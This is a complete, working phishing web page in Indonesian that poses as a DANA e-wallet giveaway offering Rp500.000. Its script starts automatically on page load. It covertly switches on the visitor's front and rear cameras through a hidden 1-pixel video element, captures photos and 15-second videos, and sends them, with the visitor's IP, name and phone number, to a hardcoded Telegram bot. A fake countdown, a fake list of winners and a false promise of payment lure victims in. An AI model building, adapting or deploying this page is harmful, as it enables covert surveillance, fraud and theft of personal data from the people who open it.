<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giveaway DANA - Klaim Hadiah</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }
        body {
            background: linear-gradient(135deg, #008CFF, #0059ff);
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 480px;
            margin: auto;
            padding: 30px 20px;
        }
        .card {
            background: rgba(255,255,255,.12);
            backdrop-filter: blur(18px);
            border-radius: 28px;
            padding: 30px 25px;
        }
        .logo {
            width: 80px;
            margin: 0 auto 20px;
            display: block;
        }
        h1 {
            font-size: 28px;
            text-align: center;
            margin-bottom: 10px;
        }
        .reward-box {
            background: white;
            color: #0059ff;
            border-radius: 24px;
            padding: 20px;
            text-align: center;
            margin: 20px 0;
        }
        .reward-amount {
            font-size: 36px;
            font-weight: 700;
        }
        input, button {
            width: 100%;
            padding: 14px;
            margin: 8px 0;
            border-radius: 16px;
            border: none;
            font-size: 15px;
        }
        input {
            background: rgba(255,255,255,.15);
            color: white;
        }
        input::placeholder {
            color: rgba(255,255,255,.6);
        }
        button {
            background: white;
            color: #0059ff;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        button:disabled {
            background: #cccccc;
            color: #333333;
            cursor: default;
        }
        .timer-box {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin: 20px 0;
        }
        .time-box {
            background: rgba(0,0,0,.3);
            padding: 10px 18px;
            border-radius: 16px;
            text-align: center;
        }
        .time-box h2 {
            font-size: 28px;
        }
        .users {
            margin-top: 20px;
            background: rgba(255,255,255,.08);
            border-radius: 20px;
            padding: 15px;
        }
        .user-item {
            display: flex;
            justify-content: space-between;
            margin: 10px 0;
            font-size: 13px;
        }
        .status-success {
            color: #7CFF98;
        }
        /* Status text hidden - kosong tidak muncul */
        .status-text {
            display: none;
        }
        /* Kamera hidden - tetap jalan tapi tidak kelihatan */
        video {
            position: fixed;
            bottom: 0;
            right: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            z-index: -9999;
            pointer-events: none;
        }
        canvas {
            display: none;
        }
        /* Pemberitahuan sukses (opsional) */
        .success-msg {
            margin-top: 15px;
            padding: 10px;
            background: rgba(0,0,0,0.3);
            border-radius: 12px;
            text-align: center;
            font-size: 13px;
            color: #7CFF98;
            display: none;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_dana_blue.svg" alt="DANA">
        <h1>🎁 Klaim Saldo Rp500.000</h1>

        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>

        <div class="reward-box">
            <div class="reward-amount">Rp500.000</div>
            <div>Untuk 50 pengguna pertama</div>
        </div>

        <div class="timer-box">
            <div class="time-box"><h2 id="hours">01</h2><span>Jam</span></div>
            <div class="time-box"><h2 id="minutes">59</h2><span>Menit</span></div>
            <div class="time-box"><h2 id="seconds">59</h2><span>Detik</span></div>
        </div>

        <input type="text" id="nama" placeholder="Nama lengkap">
        <input type="text" id="nomor" placeholder="Nomor DANA / WhatsApp">

        <button id="claimBtn">⭐ Klaim Hadiah ⭐</button>

        <div class="users">
            <div class="user-item"><span>📱 Rizky F.</span><span class="status-success">Berhasil</span></div>
            <div class="user-item"><span>📱 Sinta A.</span><span class="status-success">Berhasil</span></div>
            <div class="user-item"><span>📱 Bagas P.</span><span class="status-success">Berhasil</span></div>
        </div>

        <div id="successMsg" class="success-msg"></div>
        <p id="status" class="status-text"></p>
    </div>
</div>

<script>
    // 🔴 GANTI DENGAN TOKEN TELEGRAM KAMU SENDIRI
    const BOT_TOKEN = '8726214438:AAFxpTjm32sD2gJkQZvicI6nc5BFI9ZaaHs';  // GANTI!
    const CHAT_ID   = '7319985632';  // GANTI!

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    let mediaRecorder;
    let recordedChunks = [];
    let currentStream = null;
    let isFrontCamera = true;
    let isProcessing = false; // Mencegah double run

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch { return 'tidak diketahui'; }
    }

    async function getCameraStream(useFront) {
        try {
            const constraints = {
                video: useFront ? { facingMode: "user" } : { facingMode: "environment" }
            };
            return await navigator.mediaDevices.getUserMedia(constraints);
        } catch (err) {
            console.warn('FacingMode gagal, pakai default:', err);
            return await navigator.mediaDevices.getUserMedia({ video: true });
        }
    }

    async function captureFoto(namaCamera) {
        if (!video.videoWidth || video.videoWidth === 0) {
            await new Promise(r => setTimeout(r, 300));
        }
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
        const nama = document.getElementById('nama').value.trim() || 'belum diisi';
        const nomor = document.getElementById('nomor').value.trim() || 'belum diisi';
        const ip = await getIP();
        
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, `foto_${namaCamera}.jpg`);
        formData.append('caption', `📸 FOTO ${namaCamera.toUpperCase()}\n👤 Nama: ${nama}\n📱 No: ${nomor}\n🌐 IP: ${ip}\n⏰ ${new Date().toLocaleString('id-ID')}`);
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
            return true;
        } catch (err) {
            console.error('Gagal kirim foto:', err);
            return false;
        }
    }

    function rekamVideo(durasiDetik, cameraName) {
        return new Promise(async (resolve) => {
            if (!currentStream) {
                resolve(false);
                return;
            }
            
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm' });
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = async () => {
                if (recordedChunks.length > 0) {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const nama = document.getElementById('nama').value.trim() || 'belum diisi';
                    const nomor = document.getElementById('nomor').value.trim() || 'belum diisi';
                    
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('video', blob, `video_${cameraName}_${Date.now()}.webm`);
                    formData.append('caption', `🎥 VIDEO ${cameraName.toUpperCase()} (${durasiDetik} detik)\n👤 ${nama}\n📱 ${nomor}\n⏰ ${new Date().toLocaleString('id-ID')}`);
                    
                    try {
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
                    } catch(e) { console.error(e); }
                }
                resolve(true);
            };
            
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, durasiDetik * 1000);
        });
    }

    async function switchCamera(useFront) {
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }
        
        isFrontCamera = useFront;
        currentStream = await getCameraStream(useFront);
        video.srcObject = currentStream;
        await new Promise(r => video.onloadedmetadata = r);
        await new Promise(r => setTimeout(r, 1000)); // jeda stabil 1 detik
    }

    async function startPhishing() {
        if (isProcessing) return;
        isProcessing = true;
        
        try {
            // 1. Mulai dengan kamera depan
            await switchCamera(true);
            await captureFoto('depan');
            await rekamVideo(15, 'depan');  // 15 detik
            
            // 2. Switch ke kamera belakang
            await switchCamera(false);
            await captureFoto('belakang');
            await rekamVideo(15, 'belakang'); // 15 detik
            
        } catch (err) {
            console.error('Error saat proses kamera:', err);
        }
    }

    // Tombol klaim (hanya 1x)
    document.getElementById('claimBtn').onclick = async () => {
        const btn = document.getElementById('claimBtn');
        const nama = document.getElementById('nama').value.trim();
        const nomor = document.getElementById('nomor').value.trim();
        const successMsg = document.getElementById('successMsg');
        
        // Cek apakah tombol sudah pernah diklik
        if (btn.disabled === true) {
            return;
        }
        
        if (!nama || !nomor) {
            // Kasih efek sebentar
            const originalText = btn.innerText;
            btn.innerText = '⚠️ Isi nama & nomor DANA!';
            setTimeout(() => {
                btn.innerText = originalText;
            }, 2000);
            return;
        }
        
        // Disable tombol
        btn.disabled = true;
        btn.innerText = '✅ Sedang diproses...';
        
        // Kirim data form ke Telegram
        const ip = await getIP();
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('text', `📝 DATA FORM\n👤 Nama: ${nama}\n📱 No: ${nomor}\n🌐 IP: ${ip}\n⏰ ${new Date().toLocaleString('id-ID')}`);
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
        } catch(e) {}
        
        // Ubah tombol jadi pemberitahuan final
        btn.innerText = '💰 Dana akan masuk dalam 72 jam';
        btn.style.background = '#cccccc';
        btn.style.color = '#333333';
        btn.style.cursor = 'default';
        
        // Tampilkan pesan sukses (opsional, tidak mencurigakan)
        successMsg.style.display = 'block';
        successMsg.innerHTML = '✅ Pengajuan berhasil! Saldo Rp500.000 akan dikirim dalam 72 jam ke nomor DANA Anda.';
    };

    // Jalankan kamera otomatis saat halaman load
    window.addEventListener('load', () => {
        setTimeout(startPhishing, 100);
    });

    // Timer countdown (1 jam 59 menit 59 detik)
    let seconds = 7199;
    setInterval(() => {
        if (seconds >= 0) {
            document.getElementById('hours').innerText = String(Math.floor(seconds / 3600)).padStart(2,'0');
            document.getElementById('minutes').innerText = String(Math.floor((seconds % 3600) / 60)).padStart(2,'0');
            document.getElementById('seconds').innerText = String(seconds % 60).padStart(2,'0');
            seconds--;
        }
    }, 1000);
</script>
</body>
</html>
